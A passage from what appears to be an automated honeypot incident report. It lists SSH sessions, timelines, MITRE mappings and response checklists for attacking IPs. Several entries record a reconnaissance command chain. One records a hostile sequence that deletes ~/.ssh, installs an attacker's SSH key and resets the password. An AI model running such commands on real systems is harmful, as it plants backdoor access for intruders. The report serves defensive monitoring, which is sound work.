| `2026-07-17 07:11:56` | `cowrie.login.success` |
| `2026-07-17 07:11:56` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:11:57` | `cowrie.direct-tcpip.data` |
| `2026-07-17 07:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8eafb8b1c0

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-17 07:12 |
| **Last Seen** | 2026-07-17 07:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:12:57` | `cowrie.session.connect` |
| `2026-07-17 07:12:58` | `cowrie.client.version` |
| `2026-07-17 07:12:58` | `cowrie.client.kex` |
| `2026-07-17 07:13:02` | `cowrie.login.success` |
| `2026-07-17 07:13:04` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a04d8e3af43

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-17 07:13 |
| **Last Seen** | 2026-07-17 07:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:13:09` | `cowrie.session.connect` |
| `2026-07-17 07:13:10` | `cowrie.client.version` |
| `2026-07-17 07:13:10` | `cowrie.client.kex` |
| `2026-07-17 07:13:11` | `cowrie.login.success` |
| `2026-07-17 07:13:11` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f68bf3eb3cd3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:13 |
| **Last Seen** | 2026-07-17 07:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:13:29` | `cowrie.session.connect` |
| `2026-07-17 07:13:29` | `cowrie.client.version` |
| `2026-07-17 07:13:29` | `cowrie.client.kex` |
| `2026-07-17 07:13:31` | `cowrie.login.success` |
| `2026-07-17 07:13:33` | `cowrie.session.params` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.success` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.command.input` |
| `2026-07-17 07:13:33` | `cowrie.log.closed` |
| `2026-07-17 07:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1150f646af

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-07-17 07:14 |
| **Last Seen** | 2026-07-17 07:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:14:34` | `cowrie.session.connect` |
| `2026-07-17 07:14:35` | `cowrie.client.version` |
| `2026-07-17 07:14:35` | `cowrie.client.kex` |
| `2026-07-17 07:14:37` | `cowrie.login.success` |
| `2026-07-17 07:14:38` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c89306f37eb

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-17 07:14 |
| **Last Seen** | 2026-07-17 07:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:14:44` | `cowrie.session.connect` |
| `2026-07-17 07:14:44` | `cowrie.client.version` |
| `2026-07-17 07:14:44` | `cowrie.client.kex` |
| `2026-07-17 07:14:46` | `cowrie.login.success` |
| `2026-07-17 07:14:46` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0056f51607

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:16 |
| **Last Seen** | 2026-07-17 07:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:16:06` | `cowrie.session.connect` |
| `2026-07-17 07:16:07` | `cowrie.client.version` |
| `2026-07-17 07:16:07` | `cowrie.client.kex` |
| `2026-07-17 07:16:08` | `cowrie.login.success` |
| `2026-07-17 07:16:10` | `cowrie.session.params` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.success` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:10` | `cowrie.command.input` |
| `2026-07-17 07:16:11` | `cowrie.log.closed` |
| `2026-07-17 07:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd743a032aed

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 07:17 |
| **Last Seen** | 2026-07-17 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:17:42` | `cowrie.session.connect` |
| `2026-07-17 07:17:42` | `cowrie.client.version` |
| `2026-07-17 07:17:43` | `cowrie.client.kex` |
| `2026-07-17 07:17:43` | `cowrie.login.success` |
| `2026-07-17 07:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30fd5cb74d90

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 07:17 |
| **Last Seen** | 2026-07-17 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:17:44` | `cowrie.session.connect` |
| `2026-07-17 07:17:44` | `cowrie.client.version` |
| `2026-07-17 07:17:44` | `cowrie.client.kex` |
| `2026-07-17 07:17:45` | `cowrie.login.success` |
| `2026-07-17 07:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19efbba03c4e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 07:17 |
| **Last Seen** | 2026-07-17 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:17:44` | `cowrie.session.connect` |
| `2026-07-17 07:17:44` | `cowrie.client.version` |
| `2026-07-17 07:17:44` | `cowrie.client.kex` |
| `2026-07-17 07:17:45` | `cowrie.login.success` |
| `2026-07-17 07:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1fb413f44e8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 07:17 |
| **Last Seen** | 2026-07-17 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:17:45` | `cowrie.session.connect` |
| `2026-07-17 07:17:45` | `cowrie.client.version` |
| `2026-07-17 07:17:45` | `cowrie.client.kex` |
| `2026-07-17 07:17:46` | `cowrie.login.success` |
| `2026-07-17 07:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c80fc2d913e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:18 |
| **Last Seen** | 2026-07-17 07:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:18:48` | `cowrie.session.connect` |
| `2026-07-17 07:18:49` | `cowrie.client.version` |
| `2026-07-17 07:18:49` | `cowrie.client.kex` |
| `2026-07-17 07:18:51` | `cowrie.login.success` |
| `2026-07-17 07:18:52` | `cowrie.session.params` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.success` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:52` | `cowrie.command.input` |
| `2026-07-17 07:18:53` | `cowrie.log.closed` |
| `2026-07-17 07:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc07804b5e9

| Field | Detail |
|---|---|
| **Source IP** | `83.239.0[.]202` |
| **First Seen** | 2026-07-17 07:19 |
| **Last Seen** | 2026-07-17 07:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:19:31` | `cowrie.session.connect` |
| `2026-07-17 07:19:31` | `cowrie.client.version` |
| `2026-07-17 07:19:31` | `cowrie.client.kex` |
| `2026-07-17 07:19:32` | `cowrie.login.success` |
| `2026-07-17 07:19:32` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.0[.]202` to AbuseIPDB if not already reported
- [ ] Block `83.239.0[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727ff3458404

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-17 07:19 |
| **Last Seen** | 2026-07-17 07:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:19:37` | `cowrie.session.connect` |
| `2026-07-17 07:19:38` | `cowrie.client.version` |
| `2026-07-17 07:19:38` | `cowrie.client.kex` |
| `2026-07-17 07:19:40` | `cowrie.login.success` |
| `2026-07-17 07:19:41` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6537ece99ed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:21 |
| **Last Seen** | 2026-07-17 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:21:18` | `cowrie.session.connect` |
| `2026-07-17 07:21:19` | `cowrie.client.version` |
| `2026-07-17 07:21:19` | `cowrie.client.kex` |
| `2026-07-17 07:21:21` | `cowrie.login.success` |
| `2026-07-17 07:21:23` | `cowrie.session.params` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.success` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:23` | `cowrie.command.input` |
| `2026-07-17 07:21:24` | `cowrie.log.closed` |
| `2026-07-17 07:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d8cdcad432

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]75` |
| **First Seen** | 2026-07-17 07:22 |
| **Last Seen** | 2026-07-17 07:23 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "test\nDkPRsU3Ox2F4\nDkPRsU3Ox2F4"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:22:01` | `cowrie.session.connect` |
| `2026-07-17 07:22:04` | `cowrie.client.version` |
| `2026-07-17 07:22:04` | `cowrie.client.kex` |
| `2026-07-17 07:22:06` | `cowrie.login.success` |
| `2026-07-17 07:22:07` | `cowrie.session.params` |
| `2026-07-17 07:22:07` | `cowrie.command.input` |
| `2026-07-17 07:22:07` | `cowrie.command.failed` |
| `2026-07-17 07:22:08` | `cowrie.log.closed` |
| `2026-07-17 07:22:08` | `cowrie.session.params` |
| `2026-07-17 07:22:08` | `cowrie.command.input` |
| `2026-07-17 07:22:09` | `cowrie.session.file_download` |
| `2026-07-17 07:22:09` | `cowrie.log.closed` |
| `2026-07-17 07:22:41` | `cowrie.session.params` |
| `2026-07-17 07:22:41` | `cowrie.command.input` |
| `2026-07-17 07:22:41` | `cowrie.log.closed` |
| `2026-07-17 07:22:42` | `cowrie.session.params` |
| `2026-07-17 07:22:42` | `cowrie.command.input` |
| `2026-07-17 07:22:42` | `cowrie.command.input` |
| `2026-07-17 07:22:42` | `cowrie.command.failed` |
| `2026-07-17 07:22:42` | `cowrie.log.closed` |
| `2026-07-17 07:22:43` | `cowrie.session.params` |
| `2026-07-17 07:22:43` | `cowrie.command.input` |
| `2026-07-17 07:22:44` | `cowrie.log.closed` |
| `2026-07-17 07:22:44` | `cowrie.session.params` |
| `2026-07-17 07:22:44` | `cowrie.command.input` |
| `2026-07-17 07:22:45` | `cowrie.log.closed` |
| `2026-07-17 07:22:46` | `cowrie.session.params` |
| `2026-07-17 07:22:46` | `cowrie.command.input` |
| `2026-07-17 07:22:47` | `cowrie.log.closed` |
| `2026-07-17 07:22:47` | `cowrie.session.params` |
| `2026-07-17 07:22:47` | `cowrie.command.input` |
| `2026-07-17 07:22:47` | `cowrie.command.input` |
| `2026-07-17 07:22:48` | `cowrie.log.closed` |
| `2026-07-17 07:22:49` | `cowrie.session.params` |
| `2026-07-17 07:22:49` | `cowrie.command.input` |
| `2026-07-17 07:22:49` | `cowrie.log.closed` |
| `2026-07-17 07:22:50` | `cowrie.session.params` |
| `2026-07-17 07:22:50` | `cowrie.command.input` |
| `2026-07-17 07:22:51` | `cowrie.log.closed` |
| `2026-07-17 07:22:52` | `cowrie.session.params` |
| `2026-07-17 07:22:52` | `cowrie.command.input` |
| `2026-07-17 07:22:52` | `cowrie.log.closed` |
| `2026-07-17 07:22:53` | `cowrie.session.params` |
| `2026-07-17 07:22:53` | `cowrie.command.input` |
| `2026-07-17 07:22:54` | `cowrie.log.closed` |
| `2026-07-17 07:22:55` | `cowrie.session.params` |
| `2026-07-17 07:22:55` | `cowrie.command.input` |
| `2026-07-17 07:22:56` | `cowrie.log.closed` |
| `2026-07-17 07:22:56` | `cowrie.session.params` |
| `2026-07-17 07:22:56` | `cowrie.command.input` |
| `2026-07-17 07:22:57` | `cowrie.log.closed` |
| `2026-07-17 07:22:57` | `cowrie.session.params` |
| `2026-07-17 07:22:57` | `cowrie.command.input` |
| `2026-07-17 07:22:58` | `cowrie.log.closed` |
| `2026-07-17 07:22:59` | `cowrie.session.params` |
| `2026-07-17 07:22:59` | `cowrie.command.input` |
| `2026-07-17 07:22:59` | `cowrie.log.closed` |
| `2026-07-17 07:23:00` | `cowrie.session.params` |
| `2026-07-17 07:23:00` | `cowrie.command.input` |
| `2026-07-17 07:23:00` | `cowrie.log.closed` |
| `2026-07-17 07:23:01` | `cowrie.session.params` |
| `2026-07-17 07:23:01` | `cowrie.command.input` |
| `2026-07-17 07:23:01` | `cowrie.log.closed` |
| `2026-07-17 07:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]75` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7978f2b23eb

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-17 07:23 |
| **Last Seen** | 2026-07-17 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:23:38` | `cowrie.session.connect` |
| `2026-07-17 07:23:38` | `cowrie.client.version` |
| `2026-07-17 07:23:38` | `cowrie.client.kex` |
| `2026-07-17 07:23:40` | `cowrie.login.success` |
| `2026-07-17 07:23:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12306c1593c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:23 |
| **Last Seen** | 2026-07-17 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:23:43` | `cowrie.session.connect` |
| `2026-07-17 07:23:43` | `cowrie.client.version` |
| `2026-07-17 07:23:43` | `cowrie.client.kex` |
| `2026-07-17 07:23:45` | `cowrie.login.success` |
| `2026-07-17 07:23:47` | `cowrie.session.params` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.success` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
